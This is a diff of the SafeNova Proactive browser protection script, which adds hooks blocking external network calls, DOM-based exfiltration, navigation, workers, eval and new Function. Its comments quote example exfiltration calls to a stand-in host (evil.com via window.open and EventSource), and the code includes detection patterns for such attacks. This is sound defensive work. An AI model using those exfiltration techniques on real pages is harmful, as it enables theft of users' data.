@@ -26,11 +26,19 @@
       ArrayBuffer, DataView, Blob, URL, TextDecoder,
       CompressionStream, DecompressionStream
 
-   4. Install protective hooks on outbound network APIs to
-      intercept external requests in real time:
+   4. Install protective hooks on outbound network, DOM, and eval APIs:
         • fetch / XMLHttpRequest.open / navigator.sendBeacon
-          → block any request whose origin differs from the
-            current page origin
+        • WebSocket / window.open / EventSource
+        • Worker / SharedWorker (data: + external URL blocked)
+        • window.eval / new Function() constructor (E15/E16)
+        • setTimeout / setInterval string callbacks (E14)
+        • Element.setAttribute / innerHTML / outerHTML
+        • insertAdjacentHTML / document.write / document.writeln
+        • Location navigation (assign / replace / href setter)
+        • HTMLFormElement.submit / resource property setters on
+          img / script / iframe / video / audio / embed / object /
+          link / anchor / area prototypes
+        → MutationObserver defense-in-depth on entire document tree
 
    5. Watchdog resilience — three independent timer mechanisms
       (setInterval, recursive setTimeout, rAF chain) make it
@@ -73,11 +81,33 @@
      extensions that legitimately wrap it
    • document.createElement — extensions create elements
      (including <script>) for their own content scripts;
-     blocking this causes false positives
+     blocking this causes widespread false positives.
+     Note: <script> elements with an external src= injected
+     dynamically after page load ARE silently removed via
+     MutationObserver (section 8b) without triggering a
+     full alert — console trace only
    • JSON.stringify/parse — DevTools and frameworks patch these
    • Promise / Promise.prototype.then — polyfills wrap these
    • performance.now — privacy extensions add jitter
    • Object.defineProperty — too many legitimate uses
+   • window.location setter — [Unforgeable]; cannot be intercepted
+   Note: eval / new Function() constructor ARE blocked (E15/E16).
+
+   Design philosophy
+   ─────────────────
+   This daemon's primary goal is to protect as many JS primitives and
+   APIs as possible. At the same time the daemon itself uses JS to an
+   absolute minimum: all internal calls go through the frozen `_N`
+   snapshot rather than live globals, loop counters use indexed `for`
+   instead of iterator-based `for…of`, property lookups use the `in`
+   operator instead of hookable Set/Map methods, and string operations
+   use captured `slice` / `indexOf` rather than live prototype calls.
+   As a direct result, the integrity-checking core is well-isolated
+   and resistant to most hook-based attacks: replacing window.fetch,
+   Array.prototype.push, or other live globals after page load cannot
+   change daemon behaviour — the daemon has already captured what it
+   needs, validates those captures on every tick, and would detect the
+   replacement before an attacker could leverage it.
    ============================================================ */
 
 (() => {
@@ -304,6 +334,36 @@
         // _logThreatToConsole output cannot be silenced by console.error = () => {}.
         consoleError: console.error?.bind(console) ?? null,
 
+        // DOM exfiltration defense — element methods (D2)
+        setAttribute: Element.prototype.setAttribute,
+        getAttribute: Element.prototype.getAttribute,
+        insertAdjacentHTML: Element.prototype.insertAdjacentHTML ?? null,
+        formSubmit: HTMLFormElement.prototype.submit,
+
+        // DOM exfiltration — property descriptors for src/href/data/innerHTML/outerHTML
+        imgSrcDesc: Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src'),
+        scriptSrcDesc: Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src'),
+        iframeSrcDesc: Object.getOwnPropertyDescriptor(HTMLIFrameElement.prototype, 'src'),
+        videoSrcDesc: Object.getOwnPropertyDescriptor(HTMLVideoElement.prototype, 'src'),
+        audioSrcDesc: Object.getOwnPropertyDescriptor(HTMLAudioElement.prototype, 'src'),
+        embedSrcDesc: Object.getOwnPropertyDescriptor(HTMLEmbedElement.prototype, 'src'),
+        objectDataDesc: Object.getOwnPropertyDescriptor(HTMLObjectElement.prototype, 'data'),
+        linkHrefDesc: Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href'),
+        // <a href> and <area href> are navigation-only — NOT auto-loading resources;
+        // hooking them blocks legitimate external links in the app UI (false positives).
+        // ping= on anchors is still blocked via _RESOURCE_ATTRS in setAttribute/MO.
+        innerHTMLDesc: Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML'),
+        outerHTMLDesc: Object.getOwnPropertyDescriptor(Element.prototype, 'outerHTML'),
+
+        // Location defense — captured to block external navigation
+        locAssign: Location.prototype.assign ?? null,
+        locReplace: Location.prototype.replace ?? null,
+        locHrefDesc: Object.getOwnPropertyDescriptor(Location.prototype, 'href') ?? null,
+
+        // Document write defense
+        docWrite: Document.prototype.write ?? null,
+        docWriteln: Document.prototype.writeln ?? null,
+
         // UI — captured so our alert overlay cannot itself be intercepted
         alert: window.alert,
     });
@@ -338,6 +398,8 @@
         _N.addEventListener, _N.dispatchEvent,
         // BUG-A/C/D/F: newly-captured Array/String/Object/RegExp methods
         _reTest, _freeze, _arrPush, _strSlice,
+        // DOM exfiltration — core methods (D2)
+        _N.setAttribute, _N.getAttribute, _N.formSubmit,
     ];
     // Constructors are native but toString prints differently — check them
     // with _isNative which already handles "function Uint8Array() { [native code] }"
@@ -350,6 +412,12 @@
     // BUG-F: index assignment avoids live Array.prototype.push
     if (_N.CompressionStream) _CAPTURE_MUST_BE_NATIVE_CTORS[_CAPTURE_MUST_BE_NATIVE_CTORS.length] = _N.CompressionStream;
     if (_N.DecompressionStream) _CAPTURE_MUST_BE_NATIVE_CTORS[_CAPTURE_MUST_BE_NATIVE_CTORS.length] = _N.DecompressionStream;
+    // DOM exfiltration — optional method captures (null in older browsers)
+    if (_N.insertAdjacentHTML) _CAPTURE_MUST_BE_NATIVE[_CAPTURE_MUST_BE_NATIVE.length] = _N.insertAdjacentHTML;
+    if (_N.locAssign) _CAPTURE_MUST_BE_NATIVE[_CAPTURE_MUST_BE_NATIVE.length] = _N.locAssign;
+    if (_N.locReplace) _CAPTURE_MUST_BE_NATIVE[_CAPTURE_MUST_BE_NATIVE.length] = _N.locReplace;
+    if (_N.docWrite) _CAPTURE_MUST_BE_NATIVE[_CAPTURE_MUST_BE_NATIVE.length] = _N.docWrite;
+    if (_N.docWriteln) _CAPTURE_MUST_BE_NATIVE[_CAPTURE_MUST_BE_NATIVE.length] = _N.docWriteln;
 
     // BUG-E: for...of relies on Array.prototype[Symbol.iterator]; replacing it
     // before daemon.js loads makes both loops iterate zero elements, so
@@ -486,6 +554,8 @@
     _NATIVE_CHECKS[_NATIVE_CHECKS.length] = ['String.prototype.slice', () => String.prototype.slice];
     // BUG-E: Symbol.iterator — detect if array iteration is poisoned
     _NATIVE_CHECKS[_NATIVE_CHECKS.length] = ['Array.prototype[Symbol.iterator]', () => Array.prototype[Symbol.iterator]];
+    // DOM exfiltration — getAttribute must stay native (used by MO defense layer)
+    _NATIVE_CHECKS[_NATIVE_CHECKS.length] = ['Element.prototype.getAttribute', () => Element.prototype.getAttribute];
 
     /* ──────────────────────────────────────────────────────────
        3.  Threat response
@@ -740,7 +810,7 @@
         try {
             const _ce = _N.consoleError || console.error.bind(console);
             _ce(
-                '%c⛔️  SafeNova Proactive  │  THREAT DETECTED',
+                '%c\u26d4\ufe0f  SafeNova Proactive  \u2502  THREAT DETECTED',
                 'background:#6a0000;color:#ff5555;font-size:13px;font-weight:700;padding:3px 8px;border-radius:3px'
             );
             _ce('%c' + ('' + reason),
@@ -858,6 +928,230 @@
         }
         return _N.sendBeacon.apply(navigator, arguments);
     };
+
+    // ── D2: DOM exfiltration defense constants ─────────────────
+    // Pure-object lookup — `in` operator is a language construct,
+    // unhookable (unlike Set.prototype.has or Array.includes).
+    const _RESOURCE_ATTRS = {
+        src: 1, href: 1, data: 1, ping: 1,
+        srcset: 1, action: 1, formaction: 1, poster: 1
+    };
+    const _ON_ATTR_RE = /\bon[a-z]+\s*=/i;
+
+    /* ──────────────────────────────────────────────────────────
+       5b. DOM exfiltration hook implementations (D2)
+           Same double-hook pattern as network hooks above.
+       ────────────────────────────────────────────────────────── */
+
+    // ── setAttribute — blocks on* handlers and external resource URLs ──
+    const _setAttributeImpl = function (name, value) {
+        const lName = ('' + (name ?? '')).toLowerCase();
+        if (lName.length > 2 && lName[0] === 'o' && lName[1] === 'n') {
+            _triggerAlert('Inline event handler via setAttribute blocked \u2192 ' + lName);
+            return;
+        }
+        // <a> and <area> href= are navigation-only (user-activated click),
+        // not auto-loading. Blocking them causes false positives for normal app links.
+        // ping= on anchors is still caught below (auto-fires on click).
+        if (lName === 'href') {
+            const tag = ('' + (this.tagName || '')).toUpperCase();
+            if (tag === 'A' || tag === 'AREA') {
+                return _N.setAttribute.apply(this, arguments);
+            }
+        }
+        if (lName in _RESOURCE_ATTRS && _isExternal('' + (value ?? ''))) {
+            _triggerAlert('External resource via setAttribute blocked \u2192 ' + lName + '=' + value);
+            return;
+        }
+        return _N.setAttribute.apply(this, arguments);
+    };
+
+    // ── HTML content threat scanner ────────────────────────────
+    // indexOf-based extraction avoids hookable String.prototype.match/exec.
+    function _htmlHasThreat(html) {
+        const h = '' + (html ?? '');
+        if (_reflectApply(_reTest, _ON_ATTR_RE, [h])) return 'inline event handler';
+        if (h.indexOf('://') === -1) return false;
+        const _RATTR_KEYS = ['src=', 'href=', 'data=', 'ping=', 'action=', 'formaction=', 'poster=', 'srcset='];
+        const hLow = h.toLowerCase();
+        for (let _ri = 0; _ri < _RATTR_KEYS.length; _ri++) {
+            const attr = _RATTR_KEYS[_ri];
+            let apos = 0;
+            while (true) {
+                apos = hLow.indexOf(attr, apos);
+                if (apos === -1) break;
+                let vs = apos + attr.length;
+                while (vs < h.length && (h[vs] === ' ' || h[vs] === '\t')) vs++;
+                let ve;
+                if (h[vs] === '"' || h[vs] === "'") {
+                    const q = h[vs]; vs++;
+                    ve = h.indexOf(q, vs);
+                    if (ve === -1) ve = h.length;
+                } else {
+                    ve = vs;
+                    while (ve < h.length && h[ve] !== ' ' && h[ve] !== '>' && h[ve] !== '\t') ve++;
+                }
+                const url = h.substring(vs, ve);
+                if (_isExternal(url)) return attr + url;
+                apos = ve;
+            }
+        }
+        return false;
+    }
+
+    const _insertAdjacentHTMLImpl = function (position, html) {
+        const threat = _htmlHasThreat(html);
+        if (threat) { _triggerAlert('Threat in insertAdjacentHTML blocked \u2192 ' + threat); return; }
+        return _N.insertAdjacentHTML.apply(this, arguments);
+    };
+
+    const _docWriteImpl = function () {
+        let combined = '';
+        for (let _i = 0; _i < arguments.length; _i++) combined += '' + (arguments[_i] ?? '');
+        const threat = _htmlHasThreat(combined);
+        if (threat) { _triggerAlert('Threat in document.write blocked \u2192 ' + threat); return; }
+        return _N.docWrite.apply(this, arguments);
+    };
+    const _docWritelnImpl = function () {
+        let combined = '';
+        for (let _i = 0; _i < arguments.length; _i++) combined += '' + (arguments[_i] ?? '');
+        const threat = _htmlHasThreat(combined);
+        if (threat) { _triggerAlert('Threat in document.writeln blocked \u2192 ' + threat); return; }
+        return _N.docWriteln.apply(this, arguments);
+    };
+
+    const _locAssignImpl = function (url) {
+        if (_isExternal('' + (url ?? ''))) {
+            _triggerAlert('External navigation (assign) blocked \u2192 ' + url); return;
+        }
+        return _N.locAssign.apply(this, arguments);
+    };
+    const _locReplaceImpl = function (url) {
+        if (_isExternal('' + (url ?? ''))) {
+            _triggerAlert('External navigation (replace) blocked \u2192 ' + url); return;
+        }
+        return _N.locReplace.apply(this, arguments);
+    };
+
+    const _locHrefSetImpl = _N.locHrefDesc?.set ? (function () {
+        const _origSet = _N.locHrefDesc.set;
+        return function (val) {
+            if (_isExternal('' + (val ?? ''))) {
+                _triggerAlert('External navigation (href) blocked \u2192 ' + val); return;
+            }
+            _reflectApply(_origSet, this, [val]);
+        };
+    })() : null;
+
+    const _innerHTMLSetImpl = _N.innerHTMLDesc?.set ? (function () {
+        const _origSet = _N.innerHTMLDesc.set;
+        return function (val) {
+            const threat = _htmlHasThreat(val);
+            if (threat) { _triggerAlert('Threat in innerHTML blocked \u2192 ' + threat); return; }
+            _reflectApply(_origSet, this, [val]);
+        };
+    })() : null;
+    const _outerHTMLSetImpl = _N.outerHTMLDesc?.set ? (function () {
+        const _origSet = _N.outerHTMLDesc.set;
+        return function (val) {
+            const threat = _htmlHasThreat(val);
+            if (threat) { _triggerAlert('Threat in outerHTML blocked \u2192 ' + threat); return; }
+            _reflectApply(_origSet, this, [val]);
+        };
+    })() : null;
+
+    const _formSubmitImpl = function () {
+        const action = '' + (this.action || '');
+        if (_isExternal(action)) {
+            _triggerAlert('Form submit to external URL blocked \u2192 ' + action); return;
+        }
+        return _N.formSubmit.apply(this, arguments);
+    };
+
+    // Shared console output for silently-blocked operations (no modal alert, no key-wipe).
+    // Uses captured _N.consoleError — immune to post-load console.error replacement.
+    function _logBlockedToConsole(msg) {
+        try {
+            const _ce = _N.consoleError || console.error.bind(console);
+            _ce('%c\u26d4\ufe0f  SafeNova Proactive  \u2502  BLOCKED',
+                'background:#6a0000;color:#ff5555;font-size:13px;font-weight:700;padding:3px 8px;border-radius:3px');
+            _ce('%c' + ('' + msg),
+                'color:#ff4444;font-weight:600;font-size:12px;padding-left:4px');
+        } catch { }
+    }
+
+    // Resource property (.src/.href/.data) hook helper.
+    // Caches the setter in _H[hKey] so re-hooks reuse the same closure.
+    // noAlert — if truthy, log to console only (no modal/key-wipe). Used for
+    // <script>.src so that an injected script tag is quietly neutralised rather
+    // than surfaced as a full intrusion alert (reduces alert fatigue while still
+    // blocking the load and leaving a forensic trace in DevTools).
+    function _hookResourceProp(proto, propName, origDesc, hKey, label, noAlert) {
+        if (!origDesc || !origDesc.set) return;
+        if (!_H[hKey]) {
+            _H[hKey] = noAlert
+                ? function (val) {
+                    if (_isExternal('' + (val ?? ''))) {
+                        _logBlockedToConsole(label + ' blocked \u2192 ' + val);
+                        return;
+                    }
+                    _reflectApply(origDesc.set, this, [val]);
+                }
+                : function (val) {
+                    if (_isExternal('' + (val ?? ''))) {
+                        _triggerAlert('External ' + label + ' blocked \u2192 ' + val); return;
+                    }
+                    _reflectApply(origDesc.set, this, [val]);
+                };
+        }
+        Object.defineProperty(proto, propName, {
+            configurable: true, enumerable: true,
+            get: origDesc.get, set: _H[hKey]
+        });
+    }
+
+    // MutationObserver element threat scanner — checks a single element node.
+    function _scanElementForThreats(el) {
+        if (!el || el.nodeType !== 1) return;
+        const _elTag = ('' + (el.tagName || '')).toUpperCase();
+        // <script> elements: only intercept external-src injections.
+        // Same-origin and relative scripts (app's own modules) are allowed through.
+        // Inline scripts have no src and are handled upstream by innerHTML/document.write hooks.
+        // Full alert suppressed for scripts — console-only to avoid modal fatigue.
+        if (_elTag === 'SCRIPT') {
+            let _scriptSrc = '';
+            try { _scriptSrc = '' + (_reflectApply(_N.getAttribute, el, ['src']) || ''); } catch { }
+            if (_scriptSrc && _isExternal(_scriptSrc)) {
+                try { if (el.parentNode) el.parentNode.removeChild(el); } catch { }
+                _logBlockedToConsole('Injected external <script> removed from DOM \u2192 src=' + _scriptSrc);
+            }
+            return; // never fall through to the general attribute scan for script elements
+        }
+        const attrs = el.attributes;
+        if (!attrs) return;
+        // <a> and <area> href= are navigation attributes (user-clicked, not auto-loaded).
+        // Flagging them causes false positives on legitimate app links (e.g. about/credits).
+        // ping= on anchors is NOT skipped — it auto-fires a POST request on click.
+        const _isNavEl = (_elTag === 'A' || _elTag === 'AREA');
+        for (let _ai = 0; _ai < attrs.length; _ai++) {
+            const _a = attrs[_ai];
+            const aName = ('' + _a.name).toLowerCase();
+            if (aName.length > 2 && aName[0] === 'o' && aName[1] === 'n') {
+                try { el.removeAttribute(aName); } catch { }
+                _triggerAlert('Inline event handler on DOM element \u2192 ' + aName);
+                return;
+            }
+            if (_isNavEl && aName === 'href') continue; // navigation-only, not a resource loader
+            if (aName in _RESOURCE_ATTRS) {
+                const val = '' + (_a.value || '');
+                if (_isExternal(val)) {
+                    try { el.removeAttribute(aName); } catch { }
+                    _triggerAlert('External resource on DOM element \u2192 ' + aName + '=' + val);
+                    return;
+                }
+            }
+        }
+    }
 
     /* ──────────────────────────────────────────────────────────
        App state emergency wipe
@@ -1149,6 +1443,76 @@
             navigator.sendBeacon = _H.sendBeacon;
         }
 
+        // ── D2: DOM exfiltration hooks ──────────────────────────
+
+        _H.setAttribute = function snvSetAttribute() { return _setAttributeImpl.apply(this, arguments); };
+        Element.prototype.setAttribute = _H.setAttribute;
+
+        if (_innerHTMLSetImpl) {
+            _H.innerHTMLSet = _innerHTMLSetImpl;
+            Object.defineProperty(Element.prototype, 'innerHTML', {
+                configurable: true, enumerable: true,
+                get: _N.innerHTMLDesc.get, set: _H.innerHTMLSet
+            });
+        }
+        if (_outerHTMLSetImpl) {
+            _H.outerHTMLSet = _outerHTMLSetImpl;
+            Object.defineProperty(Element.prototype, 'outerHTML', {
+                configurable: true, enumerable: true,
+                get: _N.outerHTMLDesc.get, set: _H.outerHTMLSet
+            });
+        }
+
+        if (_N.insertAdjacentHTML) {
+            _H.insertAdjacentHTML = function snvInsertAdjacentHTML() { return _insertAdjacentHTMLImpl.apply(this, arguments); };
+            Element.prototype.insertAdjacentHTML = _H.insertAdjacentHTML;
+        }
+        if (_N.docWrite) {
+            _H.docWrite = function snvDocWrite() { return _docWriteImpl.apply(this, arguments); };
+            Document.prototype.write = _H.docWrite;
+        }
+        if (_N.docWriteln) {
+            _H.docWriteln = function snvDocWriteln() { return _docWritelnImpl.apply(this, arguments); };
+            Document.prototype.writeln = _H.docWriteln;
+        }
+
+        if (_N.locAssign) {
+            try {
+                const _fn = function snvLocAssign() { return _locAssignImpl.apply(this, arguments); };
+                Location.prototype.assign = _fn; _H.locAssign = _fn;
+            } catch { /* Location.prototype.assign non-configurable */ }
+        }
+        if (_N.locReplace) {
+            try {
+                const _fn = function snvLocReplace() { return _locReplaceImpl.apply(this, arguments); };
+                Location.prototype.replace = _fn; _H.locReplace = _fn;
+            } catch { /* Location.prototype.replace non-configurable */ }
+        }
+        if (_locHrefSetImpl && _N.locHrefDesc) {
+            try {
+                Object.defineProperty(Location.prototype, 'href', {
+                    configurable: true, enumerable: true,
+                    get: _N.locHrefDesc.get, set: _locHrefSetImpl
+                });
+                _H.locHrefSet = _locHrefSetImpl;
+            } catch { /* Location.prototype.href non-configurable */ }
+        }
+
+        _H.formSubmit = function snvFormSubmit() { return _formSubmitImpl.apply(this, arguments); };
+        HTMLFormElement.prototype.submit = _H.formSubmit;
+
+        _hookResourceProp(HTMLImageElement.prototype, 'src', _N.imgSrcDesc, 'imgSrcSet', 'img.src');
+        _hookResourceProp(HTMLScriptElement.prototype, 'src', _N.scriptSrcDesc, 'scriptSrcSet', 'script.src', true);
+        _hookResourceProp(HTMLIFrameElement.prototype, 'src', _N.iframeSrcDesc, 'iframeSrcSet', 'iframe.src');
+        _hookResourceProp(HTMLVideoElement.prototype, 'src', _N.videoSrcDesc, 'videoSrcSet', 'video.src');
+        _hookResourceProp(HTMLAudioElement.prototype, 'src', _N.audioSrcDesc, 'audioSrcSet', 'audio.src');
+        _hookResourceProp(HTMLEmbedElement.prototype, 'src', _N.embedSrcDesc, 'embedSrcSet', 'embed.src');
+        _hookResourceProp(HTMLObjectElement.prototype, 'data', _N.objectDataDesc, 'objectDataSet', 'object.data');
+        _hookResourceProp(HTMLLinkElement.prototype, 'href', _N.linkHrefDesc, 'linkHrefSet', 'link.href');
+        // HTMLAnchorElement.href and HTMLAreaElement.href are intentionally NOT hooked:
+        // they are navigation-only attributes (require user click) and blocking them
+        // causes false positives on legitimate external links in the app UI.
+
         // document.createElement is intentionally NOT hooked.
         // Extensions (Adblock, Dark Reader, etc.) legitimately create
         // <script> elements for their content scripts — blocking this
@@ -1168,7 +1532,14 @@
         const hookTampered =
             window.fetch !== _H.fetch ||
             XMLHttpRequest.prototype.open !== _H.xhrOpen ||
-            (_N.sendBeacon && navigator.sendBeacon !== _H.sendBeacon);
+            (_N.sendBeacon && navigator.sendBeacon !== _H.sendBeacon) ||
+            Element.prototype.setAttribute !== _H.setAttribute ||
+            (_H.formSubmit && HTMLFormElement.prototype.submit !== _H.formSubmit) ||
+            (_H.insertAdjacentHTML && Element.prototype.insertAdjacentHTML !== _H.insertAdjacentHTML) ||
+            (_H.docWrite && Document.prototype.write !== _H.docWrite) ||
+            (_H.docWriteln && Document.prototype.writeln !== _H.docWriteln) ||
+            (_H.locAssign && Location.prototype.assign !== _H.locAssign) ||
+            (_H.locReplace && Location.prototype.replace !== _H.locReplace);
 
         if (hookTampered) {
             _installHooks(); // silent re-hook, no alert
@@ -1426,6 +1797,140 @@
         try { window.WebSocket.prototype = _NativeWebSocket.prototype; } catch { }
     }
 
+    // ── E11: window.open — popup / navigation exfiltration ─────
+    //    window.open('https://evil.com/steal?data=...') triggers a GET
+    //    request that bypasses fetch/XHR/sendBeacon/WebSocket hooks.
+    //    Same-origin opens (popups, _blank same-site) pass through.
+    const _NativeWindowOpen = window.open;
+    if (_NativeWindowOpen && _isNative(_NativeWindowOpen)) {
+        window.open = function snvWindowOpen(url) {
+            const urlStr = '' + (url ?? '');
+            if (urlStr && _isExternal(urlStr)) {
+                _triggerAlert('window.open to external URL blocked \u2192 ' + urlStr);
+                return null;
+            }
+            return _NativeWindowOpen.apply(window, arguments);
+        };
+    }
+
+    // ── E12: EventSource — SSE-based exfiltration ───────────────
+    //    new EventSource('https://evil.com/steal?data=...')  opens a
+    //    persistent HTTP GET connection to an external server.
+    const _NativeEventSource = window.EventSource;
+    if (_NativeEventSource && _isNative(_NativeEventSource)) {
+        window.EventSource = function snvEventSource(url) {
+            if (_isExternal('' + (url ?? ''))) {
+                _triggerAlert('EventSource to external URL blocked \u2192 ' + url);
+                throw new Error('[SafeNova Proactive] External EventSource blocked');
+            }
+            return arguments.length >= 2
+                ? new _NativeEventSource(arguments[0], arguments[1])
+                : new _NativeEventSource(arguments[0]);
+        };
+        try { window.EventSource.prototype = _NativeEventSource.prototype; } catch { }
+    }
+
+    // ── E13: Worker / SharedWorker — worker-based exfiltration ──
+    //    Workers run in a separate global scope with a clean native
+    //    fetch that bypasses all page-level network hooks.
+    //    data: URLs inline hostile code; external URLs pull it.
+    const _NativeWorker = window.Worker;
+    if (_NativeWorker && _isNative(_NativeWorker)) {
+        window.Worker = function snvWorker(scriptURL) {
+            const urlStr = '' + (scriptURL ?? '');
+            if (urlStr.indexOf('data:') === 0) {
+                _triggerAlert('Worker with data: URL blocked');
+                throw new Error('[SafeNova Proactive] Worker data: URL blocked');
+            }
+            if (_isExternal(urlStr)) {
+                _triggerAlert('Worker to external URL blocked \u2192 ' + urlStr);
+                throw new Error('[SafeNova Proactive] External Worker blocked');
+            }
+            return arguments.length >= 2
+                ? new _NativeWorker(arguments[0], arguments[1])
+                : new _NativeWorker(arguments[0]);
+        };
+        try { window.Worker.prototype = _NativeWorker.prototype; } catch { }
+    }
+    const _NativeSharedWorker = window.SharedWorker;
+    if (_NativeSharedWorker && _isNative(_NativeSharedWorker)) {
+        window.SharedWorker = function snvSharedWorker(scriptURL) {
+            const urlStr = '' + (scriptURL ?? '');
+            if (urlStr.indexOf('data:') === 0) {
+                _triggerAlert('SharedWorker with data: URL blocked');
+                throw new Error('[SafeNova Proactive] SharedWorker data: URL blocked');
+            }
+            if (_isExternal(urlStr)) {
+                _triggerAlert('SharedWorker to external URL blocked \u2192 ' + urlStr);
+                throw new Error('[SafeNova Proactive] External SharedWorker blocked');
+            }
+            return arguments.length >= 2
+                ? new _NativeSharedWorker(arguments[0], arguments[1])
+                : new _NativeSharedWorker(arguments[0]);
+        };
+        try { window.SharedWorker.prototype = _NativeSharedWorker.prototype; } catch { }
+    }
+
+    // ── E14: setTimeout / setInterval string-callback guard ─────
+    //    setTimeout('malicious code', n) / setInterval('...', n) are
+    //    eval-equivalent.  SafeNova only ever passes function refs.
+    //    String callbacks are blocked unconditionally.
+    //    Daemon's own timers use _N._setTimeout/_N._setInterval
+    //    directly, bypassing this hook.
+    window.setTimeout = function snvSetTimeout(fn) {
+        if (typeof fn === 'string') {
+            _triggerAlert('setTimeout with string callback blocked');
+            return 0;
+        }
+        return _N._setTimeout.apply(window, arguments);
+    };
+    window.setInterval = function snvSetInterval(fn) {
+        if (typeof fn === 'string') {
+            _triggerAlert('setInterval with string callback blocked');
+            return 0;
+        }
+        return _N._setInterval.apply(window, arguments);
+    };
+
+    // ── E15: window.eval — indirect eval block ──────────────────
+    //    Direct eval('...') in strict-mode code cannot be overridden.
+    //    Indirect eval: (0,eval)('...') or window.eval('...') IS
+    //    overridable — this is the attack path from DevTools console.
+    //    SafeNova uses zero eval in its codebase — block all.
+    if (window.eval && _isNative(window.eval)) {
+        const _snvEval = function snvEval() {
+            _triggerAlert('eval() blocked \u2192 dynamic code injection detected');
+            throw new Error('[SafeNova Proactive] eval() blocked');
+        };
+        try {
+            // configurable:false prevents delete window.eval restoring native
+            Object.defineProperty(window, 'eval', {
+                configurable: false, enumerable: true, writable: false, value: _snvEval
+            });
+        } catch { window.eval = _snvEval; }
+    }
+
+    // ── E16: new Function() constructor — string-to-code block ──
+    //    new Function('return evil()') is a second eval-equivalent.
+    //    Blocked when called as a constructor (new.target is set).
+    //    Plain calls (typeof checks, internal framework usage) pass through.
+    const _NativeFunctionCtor = window.Function;
+    if (_NativeFunctionCtor && _isNative(_NativeFunctionCtor)) {
+        const _snvFunction = function snvFunction() {
+            if (new.target) {
+                _triggerAlert('new Function() blocked \u2192 dynamic code injection detected');
+                throw new Error('[SafeNova Proactive] new Function() blocked');
+            }
+            return _NativeFunctionCtor.apply(this, arguments);
+        };
+        try { _snvFunction.prototype = _NativeFunctionCtor.prototype; } catch { }
+        try {
+            Object.defineProperty(window, 'Function', {
+                configurable: false, enumerable: true, writable: false, value: _snvFunction
+            });
+        } catch { window.Function = _snvFunction; }
+    }
+
     // ── E10: Script-element presence monitor ───────────────────
     //    BONUS (anti-removal hardening) — captures the daemon's own
     //    <script> element via document.currentScript at IIFE evaluation
@@ -1463,6 +1968,59 @@
             _headObserver.observe(_headTarget, { childList: true, subtree: false });
         }
     } catch { /* currentScript unavailable in module context — skip silently */ }
+
+    // ── 8b. DOM exfiltration MutationObserver (defense-in-depth) ──
+    //    Watches the entire document tree for added elements or attribute
+    //    changes containing external src/href/data/on* values.
+    //    Last line of defense: catches attacks that bypass property/method hooks.
+    try {
+        if (_N.MutationObserver) {
+            const _domObserver = new _N.MutationObserver(function (mutations) {
+                for (let _mi = 0; _mi < mutations.length; _mi++) {
+                    const _mut = mutations[_mi];
+                    if (_mut.type === 'childList') {
+                        const _added = _mut.addedNodes;
+                        for (let _ni = 0; _ni < _added.length; _ni++) {
+                            const _node = _added[_ni];
+                            if (_node.nodeType !== 1) continue;
+                            _scanElementForThreats(_node);
+                            const _desc = _node.querySelectorAll
+                                ? _node.querySelectorAll('*') : [];
+                            for (let _di = 0; _di < _desc.length; _di++) {
+                                _scanElementForThreats(_desc[_di]);
+                            }
+                        }
+                    }
+                    if (_mut.type === 'attributes') {
+                        const _aName = ('' + (_mut.attributeName || '')).toLowerCase();
+                        const _tgt = _mut.target;
+                        if (_tgt.nodeType !== 1) continue;
+                        if (_aName.length > 2 && _aName[0] === 'o' && _aName[1] === 'n') {
+                            try { _tgt.removeAttribute(_aName); } catch { }
+                            _triggerAlert('Inline event handler attribute changed \u2192 ' + _aName);
+                            continue;
+                        }
+                        // <a> and <area> href changes are navigation-only — not auto-loading resources
+                        if (_aName === 'href') {
+                            const _tgtTag = ('' + (_tgt.tagName || '')).toUpperCase();
+                            if (_tgtTag === 'A' || _tgtTag === 'AREA') continue;
+                        }
+                        if (_aName in _RESOURCE_ATTRS) {
+                            let _val;
+                            try { _val = _reflectApply(_N.getAttribute, _tgt, [_aName]); } catch { continue; }
+                            if (_isExternal('' + (_val || ''))) {
+                                try { _tgt.removeAttribute(_aName); } catch { }
+                                _triggerAlert('External resource attribute changed \u2192 ' + _aName + '=' + _val);
+                            }
+                        }
+                    }
+                }
+            });
+            _domObserver.observe(document.documentElement, {
+                childList: true, subtree: true, attributes: true
+            });
+        }
+    } catch { /* MutationObserver unavailable — other hooks still active */ }
 
     // ── D1: Visibility-change fast check ───────────────────────
     //    When the tab becomes visible again, run an immediate full
